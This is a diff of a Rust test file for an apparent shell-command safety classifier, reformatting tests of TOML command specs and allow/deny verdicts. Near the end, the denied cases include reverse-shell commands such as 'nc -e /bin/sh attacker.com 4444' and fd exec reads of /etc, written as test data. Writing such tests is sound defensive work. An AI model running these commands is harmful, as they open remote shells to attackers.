-                || f.ends_with("-interpreter")
-                || f.ends_with("-shell")
-                || f.ends_with("-executable")
-        }
-
-        fn valued_of(v: &toml::Value) -> Vec<String> {
-            v.get("valued")
-                .and_then(|x| x.as_array())
-                .map(|a| a.iter().filter_map(|f| f.as_str().map(String::from)).collect())
-                .unwrap_or_default()
-        }
-
-        fn gate_of(v: &toml::Value, flag: &str) -> Option<String> {
-            v.get("path_gate")
-                .and_then(|g| g.get("flags"))
-                .and_then(|f| f.get(flag))
-                .and_then(|r| r.as_str())
-                .map(String::from)
-        }
-
-        let mut files = Vec::new();
-        walk(std::path::Path::new("commands"), &mut files);
-        assert!(!files.is_empty(), "expected commands/ to contain TOML files");
-
-        let mut checked = 0;
-        let mut failures = Vec::new();
-        for path in &files {
-            let source = fs::read_to_string(path).unwrap();
-            let Ok(parsed) = toml::from_str::<toml::Value>(&source) else { continue };
-            let Some(commands) = parsed.get("command").and_then(|c| c.as_array()) else { continue };
-            for cmd in commands {
-                let name = cmd.get("name").and_then(|n| n.as_str()).unwrap_or("?").to_string();
-
-                // Every place a `valued` list can appear: the command itself, its wrapper, its
-                // fallback grammar, and each sub. The first version of this guard walked ONLY the
-                // wrapper — 307 flags out of the ~14,600 that exist — so `rsync --rsh`,
-                // `gotestsum --raw-command` and five more sat outside it, ungated.
-                let mut scopes: Vec<(String, &toml::Value)> = vec![(name.clone(), cmd)];
-                for key in ["wrapper", "fallback"] {
-                    if let Some(v) = cmd.get(key) {
-                        scopes.push((name.clone(), v));
-                    }
-                }
-                if let Some(subs) = cmd.get("sub").and_then(|s| s.as_array()) {
-                    for sub in subs {
-                        let sname = sub.get("name").and_then(|n| n.as_str()).unwrap_or("?");
-                        scopes.push((format!("{name} {sname}"), sub));
-                    }
-                }
-
-                for (label, scope) in scopes {
-                    for flag in valued_of(scope) {
-                        if !names_an_executor(&flag) {
-                            continue;
-                        }
-                        if NOT_A_PROGRAM.iter().any(|(c, f, _)| *c == label && *f == flag) {
-                            continue;
-                        }
-                        checked += 1;
-                        let role = gate_of(scope, &flag).or_else(|| gate_of(cmd, &flag));
-                        if role.as_deref() != Some("exec") {
-                            failures.push(format!(
-                                "{}: `{label} {flag}` names a program but its path_gate role is \
-                                 {role:?} (needs \"exec\"; read/write would admit /tmp). If its \
-                                 value is NOT a program, add it to NOT_A_PROGRAM with the reason.",
-                                path.display()
-                            ));
-                        }
-                    }
-                }
-            }
-        }
-        assert!(checked > 0, "no executor-named flag was examined; guard is vacuous");
-        assert!(failures.is_empty(), "ungated executor flags:\n  {}", failures.join("\n  "));
-    }
-
-    /// most-recently-opened table, so examples written *after* a
-    /// nested table silently get attached to that table and dropped
-    /// from the command. Walks every `commands/**/*.toml` and asserts
-    /// each `[[command]]` block that mentions an `examples_*` field
-    /// produces a non-empty list on the parsed spec.
-    #[test]
-    fn examples_appear_before_nested_tables_in_every_toml() {
-        use std::fs;
-        use std::path::PathBuf;
-
-        fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
-            for entry in fs::read_dir(dir).unwrap() {
-                let entry = entry.unwrap();
-                let path = entry.path();
-                if path.is_dir() {
-                    walk(&path, out);
-                } else if path.extension().and_then(|e| e.to_str()) == Some("toml") {
-                    if path.file_name().and_then(|n| n.to_str()) == Some("SAMPLE.toml") {
-                        continue;
-                    }
-                    out.push(path);
-                }
-            }
-        }
-
-        let mut files = Vec::new();
-        walk(std::path::Path::new("commands"), &mut files);
-        assert!(!files.is_empty(), "expected commands/ to contain TOML files");
-
-        let mut failures = Vec::new();
-        for path in files {
-            let source = fs::read_to_string(&path).unwrap();
-            let parsed: toml::Value = match toml::from_str(&source) {
-                Ok(v) => v,
-                Err(e) => {
-                    failures.push(format!("{}: parse error: {e}", path.display()));
-                    continue;
-                }
-            };
-            let Some(cmds) = parsed.get("command").and_then(|v| v.as_array()) else {
-                continue;
-            };
-            for cmd in cmds {
-                let Some(name) = cmd.get("name").and_then(|v| v.as_str()) else {
-                    continue;
-                };
-                if source.contains("examples_safe")
-                    && cmd.get("examples_safe").is_none()
-                {
-                    failures.push(format!(
-                        "{}: command `{name}` — `examples_safe` text in file but \
-                         not attached to [[command]] (move it above any \
-                         [[command.sub]] / [command.fallback] table)",
-                        path.display(),
-                    ));
-                }
-                if source.contains("examples_denied")
-                    && cmd.get("examples_denied").is_none()
-                {
-                    failures.push(format!(
-                        "{}: command `{name}` — `examples_denied` text in file \
-                         but not attached to [[command]] (move it above any \
-                         [[command.sub]] / [command.fallback] table)",
-                        path.display(),
-                    ));
-                }
-            }
-        }
-        assert!(
-            failures.is_empty(),
-            "TOML examples misordered:\n{}",
-            failures.join("\n"),
-        );
-    }
-
-    /// No two `[[command]]` blocks across all TOMLs may share a `name`. A duplicate is silently
-    /// deduped at build time (one definition wins, order-dependently), so a second entry can
-    /// shadow a carefully-scoped one with NO warning — exactly how a full path-gated `sips` in
-    /// `media/` once collided with an older Inert-only `sips` in `binary/`. Walks every
-    /// `commands/**/*.toml` and fails on any name defined more than once.
-    #[test]
-    fn no_command_name_is_defined_twice() {
-        use std::collections::HashMap;
-        use std::fs;
-        use std::path::PathBuf;
-
-        fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
-            for entry in fs::read_dir(dir).unwrap() {
-                let path = entry.unwrap().path();
-                if path.is_dir() {
-                    walk(&path, out);
-                } else if path.extension().and_then(|e| e.to_str()) == Some("toml")
-                    && path.file_name().and_then(|n| n.to_str()) != Some("SAMPLE.toml")
-                {
-                    out.push(path);
-                }
-            }
-        }
-
-        let mut files = Vec::new();
-        walk(std::path::Path::new("commands"), &mut files);
-        assert!(!files.is_empty(), "expected commands/ to contain TOML files");
-        files.sort();
-
-        let mut owner: HashMap<String, PathBuf> = HashMap::new();
-        let mut dups = Vec::new();
-        for path in &files {
-            let src = fs::read_to_string(path).unwrap();
-            let parsed: toml::Value = toml::from_str(&src)
-                .unwrap_or_else(|e| panic!("{}: parse error: {e}", path.display()));
-            let Some(cmds) = parsed.get("command").and_then(|v| v.as_array()) else {
-                continue;
-            };
-            for cmd in cmds {
-                let Some(name) = cmd.get("name").and_then(|v| v.as_str()) else {
-                    continue;
-                };
-                match owner.get(name) {
-                    Some(prev) => dups.push(format!(
-                        "`{name}` defined in both {} and {}",
-                        prev.display(),
-                        path.display()
-                    )),
-                    None => {
-                        owner.insert(name.to_string(), path.clone());
-                    }
-                }
-            }
-        }
-        assert!(dups.is_empty(), "duplicate command names:\n{}", dups.join("\n"));
-    }
-
-    #[test]
-    fn handler_with_subs_and_fallback_builds_custom_kind() {
-        // Verify that a handler-using TOML carries its [[command.sub]]
-        // and [command.fallback] data through into DispatchKind::Custom.
-        // Without this, try_sub_dispatch / try_fallback_grammar would
-        // see empty data and silently deny everything the handler asks
-        // about.
-        let spec = load_one(r#"
+#[test]
+fn handler_with_subs_and_fallback_builds_custom_kind() {
+    // Verify that a handler-using TOML carries its [[command.sub]]
+    // and [command.fallback] data through into DispatchKind::Custom.
+    // Without this, try_sub_dispatch / try_fallback_grammar would
+    // see empty data and silently deny everything the handler asks
+    // about.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-handler"
 handler = "demo"
@@ -4541,31 +4176,30 @@ bare = true
 max_positional = 1
 positional_shape = "path"
 standalone = ["--help", "-h"]
-"#);
-        match &spec.kind {
-            DispatchKind::Custom { handler_name, subs, fallback, .. } => {
-                assert_eq!(handler_name, "demo");
-                let names: Vec<_> = subs.iter().map(|s| s.name.as_str()).collect();
-                assert_eq!(names, vec!["diag"]);
-                let f = fallback.as_ref().expect("fallback present");
-                assert_eq!(f.level, SafetyLevel::Inert);
-                assert_eq!(f.policy.max_positional, Some(1));
-                assert_eq!(
-                    f.positional_shape,
-                    Some(crate::policy::PositionalShape::Path),
-                );
-            }
-            other => panic!("expected Custom, got {other:?}"),
+"#,
+    );
+    match &spec.kind {
+        DispatchKind::Custom { handler_name, subs, fallback, .. } => {
+            assert_eq!(handler_name, "demo");
+            let names: Vec<_> = subs.iter().map(|s| s.name.as_str()).collect();
+            assert_eq!(names, vec!["diag"]);
+            let f = fallback.as_ref().expect("fallback present");
+            assert_eq!(f.level, SafetyLevel::Inert);
+            assert_eq!(f.policy.max_positional, Some(1));
+            assert_eq!(f.positional_shape, Some(crate::policy::PositionalShape::Path),);
         }
+        other => panic!("expected Custom, got {other:?}"),
     }
+}
 
-    #[test]
-    fn sub_policy_ref_resolves_to_handler_policy() {
-        // `policy = "key"` on a [[command.sub]] block copies the
-        // referenced handler_policy into the sub's effective flag
-        // policy at build time. Lets a single-sub form re-use a matrix
-        // entry's flag list without duplication.
-        let spec = load_one(r#"
+#[test]
+fn sub_policy_ref_resolves_to_handler_policy() {
+    // `policy = "key"` on a [[command.sub]] block copies the
+    // referenced handler_policy into the sub's effective flag
+    // policy at build time. Lets a single-sub form re-use a matrix
+    // entry's flag list without duplication.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-policy-ref"
 handler = "demo_handler"
@@ -4586,36 +4220,38 @@ level = "Inert"
 name = "search"
 policy = "shared"
 level = "Inert"
-"#);
-        match &spec.kind {
-            DispatchKind::Custom { subs, .. } => {
-                let browse = subs.iter().find(|s| s.name == "browse").unwrap();
-                match &browse.kind {
-                    DispatchKind::RequireAny { policy, require_any, .. } => {
-                        assert!(policy.standalone.iter().any(|f| f == "--web"));
-                        assert!(policy.valued.iter().any(|f| f == "--repo"));
-                        assert!(require_any.iter().any(|f| f == "--no-browser"));
-                        assert!(require_any.iter().any(|f| f == "-n"));
-                    }
-                    other => panic!("expected RequireAny (guard sets it), got {other:?}"),
+"#,
+    );
+    match &spec.kind {
+        DispatchKind::Custom { subs, .. } => {
+            let browse = subs.iter().find(|s| s.name == "browse").unwrap();
+            match &browse.kind {
+                DispatchKind::RequireAny { policy, require_any, .. } => {
+                    assert!(policy.standalone.iter().any(|f| f == "--web"));
+                    assert!(policy.valued.iter().any(|f| f == "--repo"));
+                    assert!(require_any.iter().any(|f| f == "--no-browser"));
+                    assert!(require_any.iter().any(|f| f == "-n"));
                 }
-                let search = subs.iter().find(|s| s.name == "search").unwrap();
-                match &search.kind {
-                    DispatchKind::Policy { policy, .. } => {
-                        assert!(policy.standalone.iter().any(|f| f == "--web"));
-                        assert!(policy.valued.iter().any(|f| f == "--repo"));
-                    }
-                    other => panic!("expected Policy, got {other:?}"),
-                }
+                other => panic!("expected RequireAny (guard sets it), got {other:?}"),
             }
-            other => panic!("expected Custom, got {other:?}"),
+            let search = subs.iter().find(|s| s.name == "search").unwrap();
+            match &search.kind {
+                DispatchKind::Policy { policy, .. } => {
+                    assert!(policy.standalone.iter().any(|f| f == "--web"));
+                    assert!(policy.valued.iter().any(|f| f == "--repo"));
+                }
+                other => panic!("expected Policy, got {other:?}"),
+            }
         }
+        other => panic!("expected Custom, got {other:?}"),
     }
+}
 
-    #[test]
-    fn sub_policy_ref_unknown_key_is_rejected() {
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+#[test]
+fn sub_policy_ref_unknown_key_is_rejected() {
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
 [[command]]
 name = "demo-bad-ref"
 handler = "demo_handler"
@@ -4626,18 +4262,17 @@ bare = true
 [[command.sub]]
 name = "browse"
 policy = "rael"
-"#);
-        });
-        assert!(
-            result.is_err(),
-            "[[command.sub]] policy referencing an unknown handler_policy must panic",
+"#,
         );
-    }
+    });
+    assert!(result.is_err(), "[[command.sub]] policy referencing an unknown handler_policy must panic",);
+}
 
-    #[test]
-    fn sub_policy_ref_with_inline_lists_is_rejected() {
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+#[test]
+fn sub_policy_ref_with_inline_lists_is_rejected() {
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
 [[command]]
 name = "demo-dup-ref"
 handler = "demo_handler"
@@ -4650,21 +4285,20 @@ standalone = ["--help"]
 name = "browse"
 policy = "shared"
 standalone = ["--extra"]
-"#);
-        });
-        assert!(
-            result.is_err(),
-            "mixing `policy` ref with inline standalone/valued must panic",
+"#,
         );
-    }
+    });
+    assert!(result.is_err(), "mixing `policy` ref with inline standalone/valued must panic",);
+}
 
-    #[test]
-    fn matrix_referencing_unknown_policy_is_rejected() {
-        // Silent-deny would otherwise hide typos: a matrix entry whose
-        // policy_key doesn't match any [command.handler_policy.*] would
-        // dispatch to "policy not found → Denied," masking the typo.
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+#[test]
+fn matrix_referencing_unknown_policy_is_rejected() {
+    // Silent-deny would otherwise hide typos: a matrix entry whose
+    // policy_key doesn't match any [command.handler_policy.*] would
+    // dispatch to "policy not found → Denied," masking the typo.
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
 [[command]]
 name = "demo-bad-matrix"
 handler = "demo_handler"
@@ -4678,21 +4312,20 @@ parents = ["alpha"]
 level = "Inert"
 [command.matrix.actions]
 list = "rael"
-"#);
-        });
-        assert!(
-            result.is_err(),
-            "matrix referencing an unknown handler_policy must panic at build time",
+"#,
         );
-    }
+    });
+    assert!(result.is_err(), "matrix referencing an unknown handler_policy must panic at build time",);
+}
 
-    #[test]
-    fn matrix_with_duplicate_parent_action_is_rejected() {
-        // Latent ordering footgun: if two matrices both contain the
-        // same (parent, action), only the first match wins. Panicking
-        // at build forces the author to consolidate.
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+#[test]
+fn matrix_with_duplicate_parent_action_is_rejected() {
+    // Latent ordering footgun: if two matrices both contain the
+    // same (parent, action), only the first match wins. Panicking
+    // at build forces the author to consolidate.
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
 [[command]]
 name = "demo-dup-matrix"
 handler = "demo_handler"
@@ -4713,18 +4346,17 @@ parents = ["alpha"]
 level = "SafeWrite"
 [command.matrix.actions]
 list = "b"
-"#);
-        });
-        assert!(
-            result.is_err(),
-            "duplicate (parent, action) across matrices must panic at build time",
+"#,
         );
-    }
+    });
+    assert!(result.is_err(), "duplicate (parent, action) across matrices must panic at build time",);
+}
 
-    #[test]
-    fn fallback_without_handler_is_rejected() {
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+#[test]
+fn fallback_without_handler_is_rejected() {
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
 [[command]]
 name = "demo-orphan-fallback"
 bare = true
@@ -4732,20 +4364,22 @@ bare = true
 [command.fallback]
 level = "Inert"
 bare = true
-"#);
-        });
-        assert!(
-            result.is_err(),
-            "fallback declared without a handler should panic — \
+"#,
+        );
+    });
+    assert!(
+        result.is_err(),
+        "fallback declared without a handler should panic — \
              try_fallback_grammar is only invoked from handlers, so the \
              block is dead config",
-        );
-    }
+    );
+}
 
-    #[test]
-    fn unknown_positional_shape_is_rejected() {
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+#[test]
+fn unknown_positional_shape_is_rejected() {
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
 [[command]]
 name = "demo-bad-shape"
 handler = "demo"
@@ -4753,702 +4387,701 @@ handler = "demo"
 [command.fallback]
 level = "Inert"
 positional_shape = "not-a-real-shape"
-"#);
-        });
-        assert!(
-            result.is_err(),
-            "loading an unknown positional_shape should panic with diagnostic",
+"#,
         );
-    }
+    });
+    assert!(result.is_err(), "loading an unknown positional_shape should panic with diagnostic",);
+}
 
-    #[test]
-    fn handler_without_fallback_field_has_none() {
-        // Regression: a handler-using TOML with no [command.fallback]
-        // block must produce `fallback: None` so try_fallback_grammar
-        // returns None and the handler can deny.
-        let spec = load_one(r#"
+#[test]
+fn handler_without_fallback_field_has_none() {
+    // Regression: a handler-using TOML with no [command.fallback]
+    // block must produce `fallback: None` so try_fallback_grammar
+    // returns None and the handler can deny.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-no-fallback"
 handler = "demo"
-"#);
-        match &spec.kind {
-            DispatchKind::Custom { subs, fallback, .. } => {
-                assert!(subs.is_empty());
-                assert!(fallback.is_none());
-            }
-            other => panic!("expected Custom, got {other:?}"),
+"#,
+    );
+    match &spec.kind {
+        DispatchKind::Custom { subs, fallback, .. } => {
+            assert!(subs.is_empty());
+            assert!(fallback.is_none());
         }
+        other => panic!("expected Custom, got {other:?}"),
     }
+}
 
-    #[test]
-    fn deny_field_denies_every_invocation() {
-        let source = r#"
+#[test]
+fn deny_field_denies_every_invocation() {
+    let source = r#"
 [[command]]
 name = "demo-deny"
 deny = true
 "#;
-        let specs = load_toml(source, "test").expect("valid test definition");
-        let map = build_registry(specs);
-        let spec = map.get("demo-deny").expect("demo-deny in registry");
-        for case in ["demo-deny", "demo-deny --help", "demo-deny foo bar", "demo-deny -x"] {
-            let parsed = toks(&case.split_whitespace().collect::<Vec<_>>());
-            assert_eq!(
-                dispatch_spec(&parsed, spec),
-                Verdict::Denied,
-                "expected denied: {case}",
-            );
-        }
+    let specs = load_toml(source, "test").expect("valid test definition");
+    let map = build_registry(specs);
+    let spec = map.get("demo-deny").expect("demo-deny in registry");
+    for case in ["demo-deny", "demo-deny --help", "demo-deny foo bar", "demo-deny -x"] {
+        let parsed = toks(&case.split_whitespace().collect::<Vec<_>>());
+        assert_eq!(dispatch_spec(&parsed, spec), Verdict::Denied, "expected denied: {case}",);
     }
+}
 
-    #[test]
-    fn insert_spec_replaces_aliases() {
-        let original = load_toml(r#"
+#[test]
+fn insert_spec_replaces_aliases() {
+    let original = load_toml(
+        r#"
 [[command]]
 name = "original-tool"
 aliases = ["o", "orig"]
 url = "x"
 description = "first"
 bare_flags = ["--help"]
-"#, "test").expect("valid test definition");
-        let mut map = build_registry(original);
-        assert!(map.contains_key("o"));
-        assert!(map.contains_key("orig"));
+"#,
+        "test",
+    )
+    .expect("valid test definition");
+    let mut map = build_registry(original);
+    assert!(map.contains_key("o"));
+    assert!(map.contains_key("orig"));
 
-        let override_spec = load_toml(r#"
+    let override_spec = load_toml(
+        r#"
 [[command]]
 name = "original-tool"
 deny = true
-"#, "test").expect("valid test definition").into_iter().next().unwrap();
-        super::build::insert_spec(&mut map, override_spec);
+"#,
+        "test",
+    )
+    .expect("valid test definition")
+    .into_iter()
+    .next()
+    .unwrap();
+    super::build::insert_spec(&mut map, override_spec);
 
-        assert!(!map.contains_key("o"), "stale alias 'o' must be removed");
-        assert!(!map.contains_key("orig"), "stale alias 'orig' must be removed");
-        let spec = &map["original-tool"];
-        let parsed = toks(&["original-tool", "--help"]);
-        assert_eq!(dispatch_spec(&parsed, spec), Verdict::Denied);
-    }
+    assert!(!map.contains_key("o"), "stale alias 'o' must be removed");
+    assert!(!map.contains_key("orig"), "stale alias 'orig' must be removed");
+    let spec = &map["original-tool"];
+    let parsed = toks(&["original-tool", "--help"]);
+    assert_eq!(dispatch_spec(&parsed, spec), Verdict::Denied);
+}
 
-    #[test]
-    fn toml_hash_commands_work() {
-        assert!(crate::is_safe_command("md5sum file.txt"));
-        assert!(crate::is_safe_command("sha256sum file.txt"));
-        assert!(crate::is_safe_command("b2sum file.txt"));
-        assert!(crate::is_safe_command("shasum -a 256 file.txt"));
-        assert!(crate::is_safe_command("cksum file.txt"));
-        assert!(crate::is_safe_command("md5 file.txt"));
-        assert!(crate::is_safe_command("sum file.txt"));
-        assert!(crate::is_safe_command("md5sum --check checksums.md5"));
-    }
+#[test]
+fn toml_hash_commands_work() {
+    assert!(crate::is_safe_command("md5sum file.txt"));
+    assert!(crate::is_safe_command("sha256sum file.txt"));
+    assert!(crate::is_safe_command("b2sum file.txt"));
+    assert!(crate::is_safe_command("shasum -a 256 file.txt"));
+    assert!(crate::is_safe_command("cksum file.txt"));
+    assert!(crate::is_safe_command("md5 file.txt"));
+    assert!(crate::is_safe_command("sum file.txt"));
+    assert!(crate::is_safe_command("md5sum --check checksums.md5"));
+}
 
-    #[test]
-    fn toml_hash_commands_reject_unknown() {
-        assert!(!crate::is_safe_command("md5sum --evil"));
-        assert!(!crate::is_safe_command("sha256sum --evil"));
-        assert!(!crate::is_safe_command("b2sum --evil"));
-    }
+#[test]
+fn toml_hash_commands_reject_unknown() {
+    assert!(!crate::is_safe_command("md5sum --evil"));
+    assert!(!crate::is_safe_command("sha256sum --evil"));
+    assert!(!crate::is_safe_command("b2sum --evil"));
+}
 
-    #[test]
-    fn toml_fd_allowed() {
-        assert!(crate::is_safe_command("fd pattern"));
-        assert!(crate::is_safe_command("fd -H pattern"));
-        assert!(crate::is_safe_command("fd -t f pattern"));
-        assert!(crate::is_safe_command("fd -e rs pattern"));
-        assert!(crate::is_safe_command("fd -g '*.rs'"));
-        assert!(crate::is_safe_command("fd -L pattern"));
-        assert!(crate::is_safe_command("fd -a pattern"));
-        assert!(crate::is_safe_command("fd --color auto pattern"));
-        assert!(crate::is_safe_command("fd --max-depth 3 pattern"));
-    }
+#[test]
+fn toml_fd_allowed() {
+    assert!(crate::is_safe_command("fd pattern"));
+    assert!(crate::is_safe_command("fd -H pattern"));
+    assert!(crate::is_safe_command("fd -t f pattern"));
+    assert!(crate::is_safe_command("fd -e rs pattern"));
+    assert!(crate::is_safe_command("fd -g '*.rs'"));
+    assert!(crate::is_safe_command("fd -L pattern"));
+    assert!(crate::is_safe_command("fd -a pattern"));
+    assert!(crate::is_safe_command("fd --color auto pattern"));
+    assert!(crate::is_safe_command("fd --max-depth 3 pattern"));
+}
 
-    #[test]
-    fn toml_fd_denied() {
-        // -x/--exec now DELEGATE to the inner command (like `find -exec`), so danger tracks the inner
-        // command's locus: an exec into a SYSTEM search path denies through the delegated verdict.
-        assert!(!crate::is_safe_command("fd /etc --exec cat {}"));
-        assert!(!crate::is_safe_command("fd /etc -x od {}"));
-        assert!(!crate::is_safe_command("fd /etc -X cat"));
-        assert!(!crate::is_safe_command("fd -x cat /etc/{}"));
-        // A clustered short flag that isn't a real fd flag (`-xH`/`-HX`) is not the exec flag — it
-        // fails the flag grammar and denies.
-        assert!(!crate::is_safe_command("fd -xH pattern"));
-        assert!(!crate::is_safe_command("fd -HX pattern"));
-        // Unknown search flag, and a dangling exec with no command.
-        assert!(!crate::is_safe_command("fd --evil"));
-        assert!(!crate::is_safe_command("fd -x"));
-    }
+#[test]
+fn toml_fd_denied() {
+    // -x/--exec now DELEGATE to the inner command (like `find -exec`), so danger tracks the inner
+    // command's locus: an exec into a SYSTEM search path denies through the delegated verdict.
+    assert!(!crate::is_safe_command("fd /etc --exec cat {}"));
+    assert!(!crate::is_safe_command("fd /etc -x od {}"));
+    assert!(!crate::is_safe_command("fd /etc -X cat"));
+    assert!(!crate::is_safe_command("fd -x cat /etc/{}"));
+    // A clustered short flag that isn't a real fd flag (`-xH`/`-HX`) is not the exec flag — it
+    // fails the flag grammar and denies.
+    assert!(!crate::is_safe_command("fd -xH pattern"));
+    assert!(!crate::is_safe_command("fd -HX pattern"));
+    // Unknown search flag, and a dangling exec with no command.
+    assert!(!crate::is_safe_command("fd --evil"));
+    assert!(!crate::is_safe_command("fd -x"));
+}
 
-    #[test]
-    fn toml_kafka_topics_allowed() {
-        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --list"));
-        assert!(crate::is_safe_command("kafka-topics --list --bootstrap-server localhost:9092"));
-        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --describe --topic foo"));
-        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --describe --under-replicated-partitions"));
-        assert!(crate::is_safe_command("kafka-topics --help"));
-    }
+#[test]
+fn toml_kafka_topics_allowed() {
+    assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --list"));
+    assert!(crate::is_safe_command("kafka-topics --list --bootstrap-server localhost:9092"));
+    assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --describe --topic foo"));
+    assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --describe --under-replicated-partitions"));
+    assert!(crate::is_safe_command("kafka-topics --help"));
+}
 
-    #[test]
-    fn toml_kafka_topics_denied() {
-        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --delete --topic foo"));
-        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --create --topic foo"));
-        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --alter --topic foo"));
-        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --list --create"));
-        assert!(!crate::is_safe_command("kafka-topics"));
-    }
+#[test]
+fn toml_kafka_topics_denied() {
+    assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --delete --topic foo"));
+    assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --create --topic foo"));
+    assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --alter --topic foo"));
+    assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --list --create"));
+    assert!(!crate::is_safe_command("kafka-topics"));
+}
 
-    #[test]
-    fn toml_kafka_consumer_groups_allowed() {
-        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --list"));
-        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --group acme --describe"));
-        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --describe --group acme"));
-        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --describe --all-groups"));
-    }
+#[test]
+fn toml_kafka_consumer_groups_allowed() {
+    assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --list"));
+    assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --group acme --describe"));
+    assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --describe --group acme"));
+    assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --describe --all-groups"));
+}
 
-    #[test]
-    fn toml_kafka_consumer_groups_denied() {
-        assert!(!crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --reset-offsets"));
-        assert!(!crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --delete"));
-        assert!(!crate::is_safe_command("kafka-consumer-groups"));
-    }
+#[test]
+fn toml_kafka_consumer_groups_denied() {
+    assert!(!crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --reset-offsets"));
+    assert!(!crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --delete"));
+    assert!(!crate::is_safe_command("kafka-consumer-groups"));
+}
 
-    #[test]
-    fn toml_kafka_console_consumer_allowed() {
-        assert!(crate::is_safe_command(
-            "kafka-console-consumer --bootstrap-server localhost:9092 --topic domain_events --from-beginning --max-messages 3 --timeout-ms 5000"
-        ));
-        assert!(crate::is_safe_command("kafka-console-consumer --bootstrap-server localhost:9092 --topic foo"));
-    }
+#[test]
+fn toml_kafka_console_consumer_allowed() {
+    assert!(crate::is_safe_command(
+        "kafka-console-consumer --bootstrap-server localhost:9092 --topic domain_events --from-beginning --max-messages 3 --timeout-ms 5000"
+    ));
+    assert!(crate::is_safe_command("kafka-console-consumer --bootstrap-server localhost:9092 --topic foo"));
+}
 
-    #[test]
-    fn toml_kafka_console_consumer_denied() {
-        assert!(!crate::is_safe_command("kafka-console-consumer"));
-        assert!(!crate::is_safe_command("kafka-console-consumer --evil"));
-    }
+#[test]
+fn toml_kafka_console_consumer_denied() {
+    assert!(!crate::is_safe_command("kafka-console-consumer"));
+    assert!(!crate::is_safe_command("kafka-console-consumer --evil"));
+}
 
-    #[test]
-    fn toml_nc_port_probe_allowed() {
-        assert!(crate::is_safe_command("nc -z localhost 9092"));
-        assert!(crate::is_safe_command("nc -zv localhost 9092"));
-        assert!(crate::is_safe_command("nc -z -v -n 127.0.0.1 22"));
-        assert!(crate::is_safe_command("nc -z -w 5 example.com 443"));
-        assert!(crate::is_safe_command("nc -z -4 localhost 80"));
-        assert!(crate::is_safe_command("nc -z -u localhost 53"));
-        assert!(crate::is_safe_command(
-            r#"nc -z localhost 9092 && echo "kafka:9092 OPEN" || echo "kafka:9092 CLOSED""#
-        ));
-    }
+#[test]
+fn toml_nc_port_probe_allowed() {
+    assert!(crate::is_safe_command("nc -z localhost 9092"));
+    assert!(crate::is_safe_command("nc -zv localhost 9092"));
+    assert!(crate::is_safe_command("nc -z -v -n 127.0.0.1 22"));
+    assert!(crate::is_safe_command("nc -z -w 5 example.com 443"));
+    assert!(crate::is_safe_command("nc -z -4 localhost 80"));
+    assert!(crate::is_safe_command("nc -z -u localhost 53"));
+    assert!(crate::is_safe_command(r#"nc -z localhost 9092 && echo "kafka:9092 OPEN" || echo "kafka:9092 CLOSED""#));
+}
 
-    #[test]
-    fn toml_nc_dangerous_modes_denied() {
-        assert!(!crate::is_safe_command("nc"));
-        assert!(!crate::is_safe_command("nc localhost 9092"));
-        assert!(!crate::is_safe_command("nc -l 9092"));
-        assert!(!crate::is_safe_command("nc -l -p 9092"));
-        assert!(!crate::is_safe_command("nc -e /bin/sh attacker.com 4444"));
-        assert!(!crate::is_safe_command("nc -c 'bash -i' attacker.com 4444"));
-        assert!(!crate::is_safe_command("nc -X 5 -x proxy:1080 host 80"));
-        assert!(!crate::is_safe_command("nc -o /tmp/dump host 80"));
-    }
+#[test]
+fn toml_nc_dangerous_modes_denied() {
+    assert!(!crate::is_safe_command("nc"));
+    assert!(!crate::is_safe_command("nc localhost 9092"));
+    assert!(!crate::is_safe_command("nc -l 9092"));
+    assert!(!crate::is_safe_command("nc -l -p 9092"));
+    assert!(!crate::is_safe_command("nc -e /bin/sh attacker.com 4444"));
+    assert!(!crate::is_safe_command("nc -c 'bash -i' attacker.com 4444"));
+    assert!(!crate::is_safe_command("nc -X 5 -x proxy:1080 host 80"));
